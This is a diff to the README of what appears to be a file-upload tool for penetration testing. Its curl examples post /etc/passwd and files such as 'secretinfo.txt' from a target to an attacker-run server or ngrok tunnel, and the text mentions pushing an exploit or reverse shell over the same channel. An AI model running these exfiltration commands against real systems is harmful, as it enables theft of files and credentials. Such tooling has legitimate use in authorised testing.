@@ -40,9 +40,6 @@ Can Upload and also Download Files to the Target if needed
 ```bash
 curl -L -s -X POST -F "file=@/etc/passwd" http://192.168.0.29:8000
 File uploaded!
-
-curl -L -s -X POST -F "file=@ips.txt" https://854d-11-11-11-11.ngrok-free.app
-
 ```
 ## ngrok Setup if accessing over the Internet
 
@@ -66,7 +63,12 @@ List is Dynamically Updated to show current files
 
 ![image](https://github.com/deeexcee-io/Uploader/assets/130473605/8ff1ffe1-c314-4781-a520-53ea4917ceee)
 
+### Command Line
 
+Pass the basic auth creds with cURL
+```
+curl -u "gd:SuperPassword" -L -s -X POST -F "file=@secretinfo.txt" https://854d-11-11-11-11.ngrok-free.app
+```
 
 All FIles in the Current Directory are also Served and can be Downloaded if needed. For example transferring over an exploit/reverse shell
 
